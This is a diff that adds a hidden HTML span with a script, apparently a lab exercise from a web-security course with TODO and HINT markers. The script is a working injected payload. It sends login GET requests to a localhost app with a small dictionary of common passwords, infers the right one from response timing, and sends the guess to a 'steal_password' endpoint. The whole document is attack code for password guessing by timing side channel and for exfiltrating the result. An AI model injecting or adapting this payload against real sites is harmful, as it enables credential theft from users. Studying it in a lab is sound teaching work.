@@ -1,0 +1,45 @@
+<span style='display:none'>
+  <Img id='test'/>
+  <Script>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var limit = 0;
+    var ans;
+    var elapse;
+    var test = document.getElementById(`test`);
+    test.onerror = () => {
+      var end = new Date();
+
+      /* >>>> HINT: you might want to replace this line with something else. */
+      /* console.log(`Time elapsed ${end-start}`); */
+      elapse = end - start;
+      /* <<<<< */
+
+      start = new Date();
+      var str = dictionary[index];
+      if (index < dictionary.length) {
+        /* >>>> TODO: replace string with login GET request */
+        test.src = `http://localhost:3000/get_login?username=userx&password=${str}`;
+        console.log(`Time elapsed ${elapse}`);
+        if(elapse > limit){
+          limit = elapse;
+          ans = dictionary[index - 1];
+        }
+        /* <<<< */
+      } else {
+        var xmlhttp = new XMLHttpRequest();
+        xmlhttp.open(`GET`, `http://localhost:3000/steal_password?password=${ans}&timeElapsed=${limit}`);
+        xmlhttp.onload = function() {
+          /* >>>> Reached after xmlhttp.send completes and server responds */
+        };
+        xmlhttp.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    /* >>>> TODO: replace string with login GET request */
+    test.src = `http://localhost:3000/get_login?username=userx&password=${ans}`;
+    /* <<<< */
+    index += 1;
+  </Script>
+</span>
